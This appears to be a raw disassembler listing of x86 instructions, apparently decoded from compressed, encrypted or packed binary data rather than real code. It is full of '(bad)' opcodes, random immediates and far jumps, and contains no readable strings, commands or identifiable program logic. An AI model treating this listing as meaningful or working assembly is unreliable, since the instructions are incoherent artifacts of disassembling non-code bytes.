  4188b9:	(bad)  
  4188ba:	cli    
  4188bb:	cmc    
  4188bc:	inc    ebx
  4188bd:	mov    ss:0x26341032,al
  4188c3:	gs push es
  4188c5:	or     eax,DWORD PTR [ecx]
  4188c7:	add    dh,dh
  4188c9:	add    BYTE PTR [eax],al
  4188cb:	add    dh,cl
  4188cd:	jge    0x41890e
  4188cf:	out    dx,eax
  4188d0:	xor    BYTE PTR [ebp+0xb45ca63],bl
  4188d6:	aad    0x96
  4188d8:	push   edi
  4188d9:	ret    0x17d1
  4188dc:	jle    0x4188ce
  4188de:	stc    
  4188df:	mov    bh,0x9a
  4188e1:	fucomp st(1)
  4188e3:	ins    BYTE PTR es:[edi],dx
  4188e4:	inc    esp
  4188e5:	fnstenv [ebp-0x28]
  4188e8:	sbb    edx,DWORD PTR [eax+0x27]
  4188eb:	daa    
  4188ec:	lea    ebx,[edx]
  4188ee:	mov    dh,0x42
  4188f0:	mov    bh,0x3d
  4188f2:	mov    dl,0x1d
  4188f4:	jge    0x418923
  4188f6:	aad    0xd4
  4188f8:	dec    ebp
  4188f9:	or     esi,DWORD PTR [ecx+0x49]
  4188fc:	je     0x418921
  4188fe:	fcom   QWORD PTR [ebp+0xd]
  418901:	int    0x5
  418903:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418904:	mov    esi,0x692d216
  418909:	push   ss
  41890a:	xor    al,0x11
  41890c:	pop    ds
  41890d:	inc    ah
  41890f:	pop    edi
  418910:	sub    al,0x73
  418912:	ins    DWORD PTR es:[edi],dx
  418913:	dec    ecx
  418914:	(bad)  
  418915:	in     al,dx
  418916:	pushf  
  418917:	lods   al,BYTE PTR ds:[esi]
  418918:	(bad)  [ecx-0x4ff8922]
  41891e:	dec    esp
  41891f:	iret   
  418920:	call   FWORD PTR [ebx+0x6b]
  418923:	cmp    ch,0x51
  418926:	mov    esp,0x70892f48
  41892b:	(bad)  
  41892c:	popa   
  41892d:	mov    esi,0x1573d95b
  418932:	mov    ebx,0x4a3f2f95
  418937:	push   ss
  418938:	inc    edi
  418939:	adc    DWORD PTR [edx+edx*8-0x3c2ae6e6],ebx
  418940:	sbb    DWORD PTR [edi+0x61],0x538397f
  418947:	std    
  418948:	pop    edx
  418949:	fwait
  41894a:	push   es
  41894b:	out    dx,eax
  41894c:	(bad)  
  41894d:	sbb    al,0x6
  41894f:	cmp    al,0xe8
  418951:	dec    BYTE PTR [ebx-0x5e]
  418954:	int    0x1e
  418956:	or     ecx,DWORD PTR [edx+0x73]
  418959:	xchg   bl,ch
  41895b:	stos   DWORD PTR es:[edi],eax
  41895c:	mov    ss,WORD PTR [ecx-0x5d]
  41895f:	inc    esi
  418960:	nop
  418961:	or     DWORD PTR [eax+0x5598cc],0x9f0ba66d
  41896b:	jl     0x41892e
  41896d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41896e:	(bad)  
  41896f:	adc    edx,esi
  418971:	dec    edi
  418972:	sbb    al,BYTE PTR [eax+0x67]
  418975:	call   0x2755:0xe3364250
  41897c:	sub    DWORD PTR ds:0x6e4b5f4e,edx
  418982:	in     eax,0xc3
  418984:	stos   DWORD PTR es:[edi],eax
  418985:	lahf   
  418986:	out    0x24,al
  418988:	push   0x123761cc
  41898d:	mov    fs,WORD PTR [esi+0x19]
  418990:	pop    edi
  418991:	shr    bl,cl
  418993:	rep outs dx,BYTE PTR ds:[esi]
  418995:	jp     0x4189f1
  418997:	popa   
  418998:	add    BYTE PTR [ecx],bl
  41899a:	or     eax,0x19b29509
  41899f:	inc    eax
  4189a0:	jmp    0x3ec1:0x8f43f5ec
  4189a7:	xor    eax,0x5743e114
  4189ac:	adc    al,0x64
  4189ae:	fucomi st,st(2)
  4189b0:	std    
  4189b1:	xor    al,0xeb
  4189b3:	(bad)  
  4189b4:	stc    
  4189b5:	push   esp
  4189b6:	mov    ecx,0xf68fda82
  4189bb:	xchg   ecx,eax
  4189bc:	cmp    BYTE PTR [edi+eax*2+0x7],cl
  4189c0:	and    esp,DWORD PTR [eax]
	...
  418a32:	add    BYTE PTR [eax],al
  418a34:	das    
  418a35:	stos   DWORD PTR es:[edi],eax
  418a36:	cdq    
  418a37:	inc    ecx
  418a38:	popf   
  418a39:	jae    0x418a3a
  418a3b:	out    dx,eax
  418a3c:	inc    esp
  418a3d:	dec    edi
  418a3e:	(bad)  
  418a3f:	clc    
  418a40:	outs   dx,DWORD PTR ds:[esi]
  418a41:	dec    edx
  418a42:	push   esi
  418a43:	jg     0x418a41
  418a45:	or     eax,DWORD PTR [ecx]
  418a47:	add    dh,dh
  418a49:	add    BYTE PTR [eax],al
  418a4b:	add    dh,bl
  418a4d:	fidiv  WORD PTR [edx]
  418a4f:	adc    DWORD PTR [ebx],ebp
  418a51:	ins    DWORD PTR es:[edi],dx
  418a52:	xor    DWORD PTR [edi+0x1565361a],esi
  418a58:	ds add ecx,ecx
  418a5b:	loope  0x418ada
  418a5d:	xlat   BYTE PTR ds:[ebx]
  418a5e:	sar    BYTE PTR [esi+0x6d],cl
  418a61:	xadd   ah,bl
  418a64:	sar    BYTE PTR [esi-0x596740a6],1
  418a6a:	fmul   DWORD PTR [ebx]
  418a6c:	int    0x27
  418a6e:	pushf  
  418a6f:	xchg   edx,eax
  418a70:	call   0x3007b1bb
  418a75:	std    
  418a76:	push   ss
  418a77:	push   ds
  418a78:	mov    ebx,0x3451cd3b
  418a7d:	jno    0x418aab
  418a7f:	stos   BYTE PTR es:[edi],al
  418a80:	ret    0xc2af
  418a83:	inc    ebx
  418a84:	in     eax,dx
  418a85:	jmp    0x15171499
  418a8a:	adc    bl,0x67
  418a8d:	mov    al,ds:0x304ae1d9
  418a92:	dec    esp
  418a93:	mov    ah,0x6
  418a95:	add    BYTE PTR [ecx],al
  418a97:	repz (bad) 
  418a99:	in     eax,dx
  418a9a:	mov    eax,ds:0xf5bad9e2
  418a9f:	or     eax,DWORD PTR [ecx-0x5f]
  418aa2:	jo     0x418adb
  418aa4:	call   0x15bb:0xcc2c5def
  418aab:	jp     0x418afd
  418aad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418aae:	aam    0xa8
  418ab0:	cmp    eax,0xe495e3d7
  418ab5:	xchg   esp,eax
  418ab6:	retf   0xed5e
  418ab9:	ja     0x418a8d
  418abb:	or     DWORD PTR [ebx-0x7d],ecx
  418abe:	mov    ds:0x9319664b,al
  418ac3:	sbb    al,0xb5
  418ac5:	dec    ebx
  418ac6:	aam    0xdc
  418ac8:	jle    0x418ac7
  418aca:	sbb    al,0x1d
  418acc:	jmp    0x418b41
  418ace:	fist   DWORD PTR [ebx-0x5a]
  418ad1:	pop    ebx
  418ad2:	cld    
  418ad3:	jo     0x418b29
  418ad5:	mov    bh,0xbe
  418ad7:	in     al,dx
  418ad8:	push   edi
  418ad9:	inc    edi
  418ada:	jae    0x418b30
  418adc:	push   esi
  418add:	xchg   ebp,eax
  418ade:	xor    esp,DWORD PTR [edi-0x2f]
  418ae1:	arpl   WORD PTR [eax+0x4a409afd],si
  418ae7:	mov    dl,0x2
  418ae9:	mov    eax,0xe57a7053
  418aee:	push   edx
  418aef:	ins    DWORD PTR es:[edi],dx
  418af0:	in     eax,dx
  418af1:	ds and al,0xcd
  418af4:	pop    ebx
  418af5:	cdq    
  418af6:	loope  0x418af6
  418af8:	xchg   edx,eax
  418af9:	(bad)  
  418afa:	xchg   ebx,eax
  418afb:	jno    0x418aa0
  418afd:	and    DWORD PTR [eax+0x21],edi
  418b00:	or     bh,BYTE PTR [eax+0x7c]
  418b03:	dec    edi
  418b04:	push   ebx
  418b05:	sbb    al,BYTE PTR [ecx]
  418b07:	inc    esp
  418b08:	sub    ah,dl
  418b0a:	push   ebx
  418b0b:	mov    edx,0x5e735d48
  418b10:	or     DWORD PTR [edx-0x45f69c07],0xffffffe2
  418b17:	(bad)  
  418b18:	mov    bl,0x4c
  418b1a:	xchg   esi,eax
  418b1b:	repnz mov BYTE PTR [edx],dh
  418b1e:	cmp    DWORD PTR [ecx],esp
  418b20:	test   dl,dl
  418b22:	inc    esi
  418b23:	div    bl
  418b25:	inc    esi
  418b26:	push   edx
  418b27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418b28:	push   cs
  418b29:	sub    DWORD PTR [esi+0x60],0x14c75e4
  418b30:	ins    BYTE PTR es:[edi],dx
  418b31:	pop    es
  418b32:	mov    eax,0xe7d46094
  418b37:	sbb    eax,0xb3d39fe8
  418b3c:	add    BYTE PTR [ebp+0x2bc34dc5],0x0
	...
  418bb3:	add    BYTE PTR [ecx-0x267b6f40],cl
  418bb9:	aam    0x9d
  418bbb:	int    0x19
  418bbd:	xchg   edx,eax
  418bbe:	clc    
  418bbf:	(bad)  
  418bc0:	dec    ebp
  418bc1:	cmp    DWORD PTR [esp+ebx*2],ecx
  418bc4:	repnz or al,0x1
  418bc7:	add    dh,dh
  418bc9:	add    BYTE PTR [eax],al
  418bcb:	add    BYTE PTR [edi-0x2b1d315],dl
  418bd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bd2:	in     eax,0x2f
  418bd4:	mov    cl,0x44
  418bd6:	add    eax,0xd6193b4c
  418bdb:	mov    esp,0x385c710c
  418be0:	add    eax,0x11b7e1a3
  418be5:	sbb    ebp,eax
  418be7:	xacquire xchg DWORD PTR [esi+edx*8],esi
  418beb:	dec    eax
  418bec:	test   al,0x68
  418bee:	adc    eax,0x3d17ee2c
  418bf3:	neg    DWORD PTR [eax+0x59dd26c1]
  418bf9:	int    0x4b
  418bfb:	ds scas al,BYTE PTR es:[edi]
  418bfd:	(bad)  
  418bfe:	repz scas al,BYTE PTR es:[edi]
  418c00:	in     eax,0x3
  418c02:	jmp    0x5977dccc
  418c07:	mov    dh,0x99
  418c09:	xor    ah,ah
  418c0b:	loopne 0x418c6b
  418c0d:	inc    esi
  418c0e:	popa   
  418c0f:	mov    DWORD PTR ds:[ebx],edi
  418c12:	cmp    ah,BYTE PTR [eax+ecx*1]
  418c15:	sar    ebx,1
  418c17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418c18:	scas   eax,DWORD PTR es:[edi]
  418c19:	xchg   esp,eax
  418c1a:	adc    BYTE PTR [ebx],0x75
  418c1d:	mov    dh,0xa8
  418c1f:	shl    BYTE PTR [eax+edi*8],1
  418c22:	cli    
  418c23:	ins    BYTE PTR es:[edi],dx
  418c24:	pop    es
  418c25:	clc    
  418c26:	fst    DWORD PTR fs:[edi]
  418c29:	and    bl,BYTE PTR [edi+0x7586b1eb]
  418c2f:	mov    WORD PTR [edx],es
  418c31:	adc    bl,bh
  418c33:	bound  ebp,QWORD PTR [edi-0x7ec8e998]
  418c39:	and    DWORD PTR [ecx-0xa],0xbdb27acc
  418c40:	addr16 test al,0x92
  418c43:	data16 fcom QWORD PTR [ecx-0x7a958446]
  418c4a:	mov    ecx,DWORD PTR [esp+edx*4+0x55764008]
  418c51:	stc    
  418c52:	jecxz  0x418ccd
  418c54:	push   ds
  418c55:	fdivr  st,st(0)
  418c57:	xor    DWORD PTR [edx],esi
  418c59:	popa   
  418c5a:	mov    edx,0x5189b64f
  418c5f:	lds    edi,FWORD PTR [ecx]
  418c61:	(bad)  
  418c62:	sbb    al,0x2f
  418c64:	test   BYTE PTR [eax-0x5c1d7a06],dh
  418c6a:	rol    BYTE PTR [edi],0x89
  418c6d:	push   es
  418c6e:	test   DWORD PTR [edx+0x2f9fea8a],eax
  418c74:	inc    ebx
  418c75:	jp     0x418c67
  418c77:	test   eax,0xcc006221
  418c7c:	dec    ebp
  418c7d:	ficom  WORD PTR [edi]
  418c7f:	cmc    
  418c80:	call   0xaf72:0xb3b66ec3
  418c87:	xchg   DWORD PTR [ebx-0x41df8d80],edi
  418c8d:	pusha  
  418c8e:	stc    
  418c8f:	stos   BYTE PTR es:[edi],al
  418c90:	add    ecx,DWORD PTR [eax+0x4f]
  418c93:	scas   al,BYTE PTR es:[edi]
  418c94:	(bad)  
  418c95:	ss popf 
  418c97:	sbb    DWORD PTR [ecx+0x641ae82d],esi
  418c9d:	enter  0x6c17,0xc4
  418ca1:	and    ch,BYTE PTR [edi+0x4c8f04b]
  418ca7:	inc    DWORD PTR [edx-0x67730736]
  418cad:	std    
  418cae:	lahf   
  418caf:	adc    BYTE PTR [ecx],cl
  418cb1:	scas   eax,DWORD PTR es:[edi]
  418cb2:	dec    edi
  418cb3:	inc    esp
  418cb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cb5:	jo     0x418d08
  418cb7:	pusha  
  418cb8:	jg     0x418c5b
  418cba:	fs fldcw WORD PTR ds:[ebx-0x180258fb]
	...
  418d32:	add    BYTE PTR [eax],al
  418d34:	pop    ss
  418d35:	arpl   WORD PTR ds:0x5f7f7d53,bx
  418d3b:	addr16 in eax,dx
  418d3d:	inc    eax
  418d3e:	jmp    0xe5fc6161
  418d43:	mov    eax,0x10de8
  418d48:	test   BYTE PTR [eax],0x0
  418d4b:	add    BYTE PTR [edx+0x5d],bh
  418d4e:	in     al,0x31
  418d50:	icebp  
  418d51:	jo     0x418d9e
  418d53:	test   BYTE PTR [eax-0x54],bl
  418d56:	fs and al,0x2b
  418d59:	je     0x418d91
  418d5b:	ret    0x476b
  418d5e:	out    dx,eax
  418d5f:	cmp    eax,0x6a654b37
  418d64:	nop
  418d65:	adc    al,BYTE PTR ds:0x420dd1fa
  418d6b:	lods   al,BYTE PTR ds:[esi]
  418d6c:	enter  0xe708,0x48
  418d70:	gs mov ah,0xdb
  418d73:	xchg   edx,eax
  418d74:	add    edi,ebx
  418d76:	hlt    
  418d77:	sub    ebx,eax
  418d79:	push   esi
  418d7a:	pop    ecx
  418d7b:	sub    al,BYTE PTR [edi-0x62]
  418d7e:	jge    0x418d66
  418d80:	mov    al,0xa7
  418d82:	es retf 
  418d84:	mov    bh,0xb7
  418d86:	(bad)  
  418d87:	sub    BYTE PTR [ebp+0x667d494d],ah
  418d8d:	xlat   BYTE PTR ds:[ebx]
  418d8e:	ja     0x418dd4
  418d90:	cmp    BYTE PTR [edi],ah
  418d92:	xchg   edx,eax
  418d93:	mov    ebx,esi
  418d95:	mov    dh,0x19
  418d97:	sbb    dl,BYTE PTR [edi]
  418d99:	fld    DWORD PTR [ecx+0x195baded]
  418d9f:	mov    bh,0x32
  418da1:	popa   
  418da2:	dec    ebp
  418da3:	xchg   edx,eax
  418da4:	jg     0x418df4
  418da6:	hlt    
  418da7:	sbb    eax,0x80759cfc
  418dac:	xchg   esi,eax
  418dad:	imul   ebx,ecx,0xffffffa9
  418db0:	cli    
  418db1:	xchg   edx,eax
  418db2:	in     eax,dx
  418db3:	sub    al,0xf8
  418db5:	or     BYTE PTR [ecx+0x3a852f9c],ah
  418dbb:	fnsetpm(287 only) 
  418dbd:	xchg   BYTE PTR [ebp-0x12e3a459],dl
  418dc3:	fstp   DWORD PTR [ebp*4-0x22b711d2]
  418dca:	xor    eax,0x3c5cf78f
  418dcf:	add    BYTE PTR ds:[ebp-0x77],ah
  418dd3:	cmc    
  418dd4:	xor    ecx,DWORD PTR [edi]
  418dd6:	pop    ss
  418dd7:	mov    bh,0x10
  418dd9:	imul   DWORD PTR [eax+0x354ede7d]
  418ddf:	cli    
  418de0:	pop    eax
  418de1:	int3   
  418de2:	(bad)  
  418de3:	in     al,dx
  418de4:	pushf  
  418de5:	out    0xef,al
  418de7:	pusha  
  418de8:	push   es
  418de9:	(bad)  
  418deb:	jmp    0xc7f47375
  418df0:	aas    
  418df1:	push   edx
  418df2:	xlat   BYTE PTR ds:[ebx]
  418df3:	xchg   esi,eax
  418df4:	fild   DWORD PTR [ebp-0x1344e3fa]
  418dfa:	lods   eax,DWORD PTR ds:[esi]
  418dfb:	jmp    0x15d032d9
  418e00:	mov    gs,WORD PTR [ebp+0x5a7f9eef]
  418e06:	loop   0x418e33
  418e08:	sahf   
  418e09:	pop    ss
  418e0a:	jnp    0x418dd2
  418e0c:	pop    edi
  418e0d:	sbb    al,0xed
  418e0f:	pop    ebp
  418e10:	call   0xc39665de
  418e15:	mov    cl,dl
  418e17:	jnp    0x418e26
  418e19:	cmc    
  418e1a:	inc    esi
  418e1b:	fcom   DWORD PTR [edx-0x50045a7f]
  418e21:	stos   DWORD PTR es:[edi],eax
  418e22:	pusha  
  418e23:	ins    DWORD PTR es:[edi],dx
  418e24:	add    DWORD PTR [eax-0x1b362b86],ebx
  418e2a:	push   eax
  418e2b:	pop    ebx
  418e2c:	popa   
  418e2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e2e:	mov    eax,ds:0x5b2ddbcc
  418e33:	add    DWORD PTR [edx+0x74],ecx
  418e36:	pop    ds
  418e37:	fdiv   DWORD PTR [esi+0x2c]
  418e3a:	icebp  
  418e3b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e3c:	cmp    edx,0x8b6ac813
	...
  418eb2:	add    BYTE PTR [eax],al
  418eb4:	(bad)  
  418eb5:	out    0xe6,al
  418eb7:	cmp    esp,esi
  418eb9:	cmp    edi,edi
  418ebb:	push   DWORD PTR [eax-0x20]
  418ebe:	jecxz  0x418eb9
  418ec0:	add    ebp,edx
  418ec2:	lahf   
  418ec3:	data16 fimul WORD PTR [esi]
  418ec6:	add    DWORD PTR [eax],eax
  418ec8:	test   BYTE PTR [eax],0x0
  418ecb:	add    BYTE PTR [edx],bl
  418ecd:	mov    ah,0x3e
  418ecf:	or     ah,BYTE PTR [edi-0x546a0ba8]
  418ed5:	push   ecx
  418ed6:	xchg   edx,eax
  418ed7:	add    esp,DWORD PTR [ebx-0x2a]
  418eda:	pop    eax
  418edb:	xchg   edx,eax
  418edc:	loop   0x418f51
  418ede:	jno    0x418e89
  418ee0:	jnp    0x418eda
  418ee2:	ret    
  418ee3:	gs jl  0x418e86
  418ee6:	mov    BYTE PTR [edi+ebx*1+0x3b2d14d7],ah
  418eed:	push   edi
  418eee:	cs gs jne 0x418f2d
  418ef2:	jae    0x418f4b
  418ef4:	xchg   DWORD PTR [edx-0x38],esi
  418ef7:	xchg   esi,eax
  418ef8:	pop    eax
  418ef9:	icebp  
  418efa:	ret    
  418efb:	fisubr DWORD PTR [eax+0x9]
  418efe:	xchg   ebx,eax
  418eff:	mov    ch,BYTE PTR [esi+edx*2]
  418f02:	fisttp WORD PTR [edi-0x6815b6d1]
  418f08:	dec    edi
  418f09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f0a:	mov    esi,DWORD PTR [ecx]
  418f0c:	data16 xlat BYTE PTR ds:[ebx]
  418f0e:	out    0x42,eax
  418f10:	int    0xc6
  418f12:	push   ebx
  418f13:	scas   al,BYTE PTR es:[edi]
  418f14:	idiv   BYTE PTR [ebx-0x189b50dd]
  418f1a:	retf   0x6520
  418f1d:	loope  0x418e9f
  418f1f:	pop    eax
  418f20:	mov    dh,0x6
  418f22:	xor    bl,al
  418f24:	repz inc ebp
  418f26:	mov    ds:0x9e31e767,al
  418f2b:	jg     0x418f9e
  418f2d:	fwait
  418f2e:	popa   
  418f2f:	push   esi
  418f30:	in     eax,dx
  418f31:	nop
  418f32:	jbe    0x418eba
  418f34:	repnz xor eax,0x3b96e6f1
  418f3a:	xchg   ebx,eax
  418f3b:	(bad)  
  418f3d:	mov    edi,0xa2dbd01d
  418f42:	mov    dl,0xa4
  418f44:	mov    BYTE PTR [edx+0x7],al
  418f47:	dec    ecx
  418f48:	popf   
  418f49:	es dec ebx
  418f4b:	and    ah,BYTE PTR [ebp+0x3d34f77e]
  418f51:	xchg   ebx,eax
  418f52:	or     bh,BYTE PTR gs:[esi]
  418f55:	adc    al,0xe0
  418f57:	ja     0x418f8e
  418f59:	aas    
  418f5a:	(bad)
  418f5d:	jno    0x418fb3
  418f5f:	repnz pop ebx
  418f61:	lods   eax,DWORD PTR ds:[esi]
  418f62:	cmp    eax,0xaa318aa5
  418f67:	fild   QWORD PTR [esi-0xb2b0171]
  418f6d:	ror    BYTE PTR [ebp+0x30],0x13
  418f71:	jno    0x418f95
  418f73:	pop    esi
  418f74:	pop    es
  418f75:	xchg   ecx,eax
  418f76:	xchg   edi,eax
  418f77:	cli    
  418f78:	xchg   edi,eax
  418f79:	pop    ebp
  418f7a:	and    eax,0xa5060e98
  418f7f:	stos   BYTE PTR es:[edi],al
  418f80:	mov    ecx,0xb476e197
  418f85:	push   ebx
  418f86:	shl    BYTE PTR [ebx+eiz*8-0x62],0xdb
  418f8b:	jecxz  0x418ffe
  418f8d:	pop    edi
  418f8e:	mov    cl,0x42
  418f90:	mov    ebx,0xb835212a
  418f95:	xor    DWORD PTR [edi+edx*2-0x71],0x40
  418f9a:	sbb    ch,BYTE PTR [ebp+0x59148840]
  418fa0:	xchg   esp,eax
  418fa1:	add    DWORD PTR [edx+0x416f95b4],0x66
  418fa8:	in     eax,dx
  418fa9:	jmp    0x3835:0xfa00fa3d
  418fb0:	dec    esi
  418fb1:	clc    
  418fb2:	pop    ss
  418fb3:	mov    dl,bl
  418fb5:	pop    ebx
  418fb6:	dec    esi
  418fb7:	ret    0x4713
  418fba:	sti    
  418fbb:	mov    ds:0xa2ba9159,al
  418fc0:	aaa    
  418fc1:	pop    esi
	...
  419032:	add    BYTE PTR [eax],al
  419034:	test   eax,0xff456b7e
  419039:	push   ebp
  41903a:	scas   eax,DWORD PTR es:[edi]
  41903b:	(bad)  
  41903c:	out    dx,eax
  41903d:	mov    ch,0xb6
  41903f:	ror    BYTE PTR [esi+0xf],cl
  419042:	rcl    BYTE PTR [esp+edx*8+0xf],0x1
  419047:	add    dh,dh
  419049:	add    BYTE PTR [eax],al
  41904b:	add    BYTE PTR [edx+0x5388a6ad],cl
  419051:	loop   0x419073
  419053:	fwait
  419054:	inc    ebx
  419055:	mov    gs,WORD PTR [ecx]
  419057:	push   esp
  419058:	fsubr  st(0),st
  41905a:	rcr    BYTE PTR fs:[esp+ebx*1+0x18],1
  41905f:	(bad)
  419063:	out    dx,eax
  419064:	xchg   ecx,eax
  419065:	cli    
  419066:	inc    edx
  419067:	dec    ebp
  419068:	adc    ebx,esp
  41906a:	xchg   esp,eax
  41906b:	aad    0x2
  41906d:	jmp    0x419033
  41906f:	jne    0x419000
  419071:	or     ecx,DWORD PTR [ebx+0x4e833214]
  419077:	cmp    bh,BYTE PTR [edx+esi*4-0x538e475d]
  41907e:	sbb    BYTE PTR [edx-0x14c85d1e],ah
  419084:	ja     0x419079
  419086:	mov    cl,0xd6
  419088:	cmp    al,0x77
  41908a:	les    eax,FWORD PTR [eax]
  41908c:	fist   WORD PTR [edx+0x3d]
  41908f:	es push esi
  419091:	js     0x419065
  419093:	push   ebx
  419094:	cld    
  419095:	or     al,0x89
  419097:	into   
  419098:	mov    bh,0x67
  41909a:	xchg   esp,eax
  41909b:	fmul   DWORD PTR [ebp+0x12466590]
  4190a1:	xor    BYTE PTR ds:0xaa79b0d9,bl
  4190a7:	pop    ss
  4190a8:	jb     0x4190fc
  4190aa:	mov    ecx,0xe5283df7
  4190af:	test   cl,dh
  4190b1:	sub    eax,DWORD PTR [eax+ecx*1]
  4190b4:	adc    DWORD PTR [ecx-0x78e76405],0x3a3f8642
  4190be:	jmp    0x419114
  4190c0:	call   0x680d:0x60579b67
  4190c7:	add    eax,0x2c2f446a
  4190cc:	jns    0x419142
  4190ce:	(bad)  
  4190cf:	retf   0x5013
  4190d2:	fcomip st,st(7)
  4190d4:	ss mov al,0x62
  4190d7:	mov    dh,0xf4
  4190d9:	aam    0xc9
  4190db:	repz sar BYTE PTR [ebp-0x354d98d3],cl
  4190e2:	xor    eax,DWORD PTR [ecx]
  4190e4:	or     BYTE PTR [ebx-0x2310c53a],bh
  4190ea:	ja     0x41906e
  4190ec:	xor    DWORD PTR [edi-0x29],eax
  4190ef:	or     ebp,DWORD PTR [ebp+0x1f4f60a6]
  4190f5:	iret   
  4190f6:	fimul  DWORD PTR [edx-0x2c]
  4190f9:	adc    eax,0x1f85cd82
  4190fe:	nop
  4190ff:	jno    0x4190b7
  419101:	idiv   BYTE PTR [ecx-0x2aab5bf1]
  419107:	cmc    
  419108:	mov    al,0x14
  41910a:	aaa    
  41910b:	push   ebx
  41910c:	js     0x4190cd
  41910e:	sar    DWORD PTR [eax+0x32],0xad
  419112:	push   ecx
  419113:	fs ret 0xcebe
  419117:	out    dx,al
  419118:	adc    DWORD PTR [edx+0x494511cc],0xec8ee7dd
  419122:	jns    0x4190c1
  419124:	mov    dh,0x59
  419126:	mov    al,0xe8
  419128:	fimul  DWORD PTR [esi+0x5e8e904b]
  41912e:	lock and al,0x12
  419131:	push   ebp
  419132:	add    edi,DWORD PTR ds:0x1ae0909e
  419138:	push   0x9511c4a0
  41913d:	mov    WORD PTR [ebx+0xeb52ef],cs
	...
  4191b3:	add    BYTE PTR [edi],dh
  4191b5:	xchg   edx,eax
  4191b6:	and    al,0x83
  4191b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191b9:	mov    bh,0xb7
  4191bb:	mov    dh,0xb3
  4191bd:	cmp    al,0x9b
  4191bf:	scas   eax,DWORD PTR es:[edi]
  4191c0:	sbb    eax,0xcaa3ae83
  4191c5:	adc    BYTE PTR [ecx],al
  4191c7:	add    dh,dh
  4191c9:	add    BYTE PTR [eax],al
  4191cb:	add    BYTE PTR [eax-0x3ade736],al
  4191d1:	push   esp
  4191d2:	sub    ch,cl
  4191d4:	sub    al,0x15
  4191d6:	scas   al,BYTE PTR es:[edi]
  4191d7:	sbb    eax,0xf370af8e
  4191dc:	mov    esp,0x8c722e7d
  4191e1:	int    0x71
  4191e3:	imul   edi,DWORD PTR gs:[eax+0x141dde45],0x8ed9e97c
  4191ee:	pop    eax
  4191ef:	or     edx,ebp
  4191f1:	and    eax,edx
  4191f3:	pop    esi
  4191f4:	mov    eax,ds:0x5b7f5df0
  4191f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191fa:	bound  ecx,QWORD PTR [ebx-0xc15b807]
  419200:	pop    ss
  419201:	inc    ebp
  419202:	or     eax,0xe46bef7b
  419207:	inc    ebx
  419208:	and    BYTE PTR [ebx],bh
  41920a:	or     BYTE PTR [edx-0x63],0x3
  41920e:	fcomip st,st(7)
  419210:	stos   BYTE PTR es:[edi],al
  419211:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419212:	into   
  419213:	jno    0x4191bc
  419215:	mov    ebp,0xb283fd2c
  41921a:	push   ds
  41921b:	popa   
  41921c:	lfs    ebp,FWORD PTR [ecx+0x1e]
  419220:	mov    BYTE PTR [ecx-0x52],dh
  419223:	mov    ds:0xfa9d260c,al
  419228:	sub    ch,BYTE PTR [esi]
  41922a:	dec    ecx
  41922b:	cld    
  41922c:	xchg   ebp,eax
  41922d:	jae    0x419211
  41922f:	std    
  419230:	loope  0x4191e1
  419232:	(bad)  
  419233:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419234:	ds or  cl,bl
  419237:	mov    eax,0x10e1e0b1
  41923c:	push   eax
  41923d:	(bad)  
  41923e:	lds    esi,FWORD PTR [ebx]
  419240:	retf   0xdd64
  419243:	jb     0x4191ed
  419245:	div    DWORD PTR [ecx]
  419247:	loop   0x419248
  419249:	shr    BYTE PTR [ebp+0x43bc5b88],1
  41924f:	cmp    ebx,DWORD PTR [ecx]
  419251:	sub    edi,ebp
  419253:	cwde   
  419254:	lods   al,BYTE PTR ds:[esi]
  419255:	cmp    eax,0x3a9c038c
  41925a:	xor    eax,0x1c36f6eb
  41925f:	out    dx,al
  419260:	add    ah,ah
  419262:	mov    al,ds:0x43505fd3
  419267:	lock test eax,0x42c1f105
  41926d:	addr16 repnz aam 0x27
  419271:	popf   
  419272:	bound  ebp,QWORD PTR [esi+0x1cded7e9]
  419278:	imul   esi
  41927a:	nop
  41927b:	jp     0x419204
  41927d:	mov    dh,0x22
  41927f:	push   ebp
  419280:	cli    
  419281:	outs   dx,BYTE PTR ds:[esi]
  419282:	fsubr  QWORD PTR [ecx]
  419284:	popf   
  419285:	pusha  
  419286:	or     esp,DWORD PTR [ecx]
  419288:	pop    edi
  419289:	pop    ss
  41928a:	lea    ebp,ds:0xc9046396
  419290:	sbb    eax,0xbd2302cb
  419295:	pop    ebp
  419296:	test   edi,ebx
  419298:	or     ch,dh
  41929a:	jmp    0x75c1101d
  41929f:	aad    0x48
  4192a1:	cmp    al,0x2f
  4192a3:	dec    eax
  4192a4:	mov    eax,ds:0xc2002902
  4192a9:	test   bl,cl
  4192ab:	xchg   esi,eax
  4192ac:	or     esi,DWORD PTR [edi+0x311e2526]
  4192b2:	xor    esi,DWORD PTR [edx]
  4192b4:	and    bh,BYTE PTR [edx]
  4192b6:	out    0x66,al
  4192b8:	cli    
  4192b9:	shl    BYTE PTR ds:0x28434763,cl
  4192bf:	test   BYTE PTR [edi+ebp*4+0x0],bl
	...
  419332:	add    BYTE PTR [eax],al
  419334:	fdiv   QWORD PTR [ebx-0x2380afc1]
  41933a:	(bad)  
  41933b:	mov    edi,0xbcd03e15
  419340:	adc    cl,cl
  419342:	loopne 0x419349
  419344:	rcl    BYTE PTR [ecx],0x1
  419347:	add    dh,dh
  419349:	add    BYTE PTR [eax],al
  41934b:	add    BYTE PTR [edx],dl
  41934d:	dec    edi
  41934e:	cmp    DWORD PTR [edi],0x21631761
  419354:	pop    ss
  419355:	(bad)  
  419356:	push   ds
  419357:	cmp    eax,0x2209f817
  41935c:	mov    ch,0x25
  41935e:	fwait
  41935f:	ss xchg esp,eax
  419361:	dec    ecx
  419362:	sub    al,0x9a
  419364:	xchg   esp,eax
  419365:	mov    al,ds:0x13e370d9
  41936a:	mov    WORD PTR [eax+0x681a2dd],fs
